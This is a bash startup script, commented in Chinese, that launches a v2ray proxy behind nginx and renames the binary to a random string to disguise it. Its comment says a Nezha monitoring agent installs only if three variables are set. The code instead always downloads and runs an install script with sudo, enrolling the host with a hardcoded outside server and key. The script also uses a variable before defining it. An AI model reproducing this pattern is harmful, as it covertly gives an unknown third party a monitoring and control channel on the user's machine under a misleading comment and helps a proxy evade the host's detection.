#!/usr/bin/env bash

# 定义 UUID 及 伪装路径,请自行修改.(注意:伪装路径以 / 符号开始,为避免不必要的麻烦,请不要使用特殊符号.)
base64 -d config > config.json
UUID=${UUID:-'b1c6ab84-c9b7-4088-bda7-402d18a7ffff'}
VMESS_WSPATH=${VMESS_WSPATH:-'/vmkoy'}
VLESS_WSPATH=${VLESS_WSPATH:-'/vlkoy'}
sed -i "s#UUID#$UUID#g;s#VMESS_WSPATH#${VMESS_WSPATH}#g;s#VLESS_WSPATH#${VLESS_WSPATH}#g" config.json
sed -i "s#VMESS_WSPATH#${VMESS_WSPATH}#g;s#VLESS_WSPATH#${VLESS_WSPATH}#g" /etc/nginx/nginx.conf
sed -i "s#RELEASE_RANDOMNESS#${RELEASE_RANDOMNESS}#g" /etc/supervisor/conf.d/supervisord.conf

# 伪装 v2ray 执行文件
RELEASE_RANDOMNESS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 6)
mv v ${RELEASE_RANDOMNESS}
cat config.json | base64 > config
rm -f config.json

# 如果有设置哪吒探针三个变量,会安装。如果不填或者不全,则不会安装
curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh install_agent ip.ao9.cn 5555 4eCWHZnFT6UAWPvpcf

# 运行 nginx 和 v2ray
nginx
base64 -d config > config.json
./${RELEASE_RANDOMNESS} -config=config.json
